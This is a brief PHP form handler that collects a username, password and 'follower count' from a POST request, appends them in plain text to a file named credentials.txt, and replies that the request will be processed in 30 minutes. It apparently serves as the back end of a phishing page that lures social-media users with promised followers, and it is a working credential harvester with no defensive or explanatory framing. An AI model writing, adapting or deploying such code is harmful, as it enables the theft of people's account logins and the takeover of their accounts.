<?php
// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', 'error_log.txt'); // Log errors to this file

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $username = $_POST["username"];
    $password = $_POST["password"];
    $followerCount = $_POST["followerCount"];

    // Validate form data (you might want to add more validation)
    if (empty($username) || empty($password) || empty($followerCount)) {
        echo "Please fill in all fields.";
        exit;
    }

    // Store data in credential file
    $filePath = "credentials.txt"; // Specify the file path
    $data = "Username: " . $username . ", Password: " . $password . ", Follower Count: " . $followerCount . "\n";

    // Write data to file
    $result = file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX); // Append to file and lock file while writing
    if ($result === false) {
        error_log("Error writing to file.");
        echo "Error writing to file.";
        exit;
    }

    // Send confirmation response back to the client
    echo "Your request has been received. Please wait for 30 minutes while we process it.";
} else {
    // If form is not submitted via POST method, return an error message
    echo "Invalid request.";
}
?>
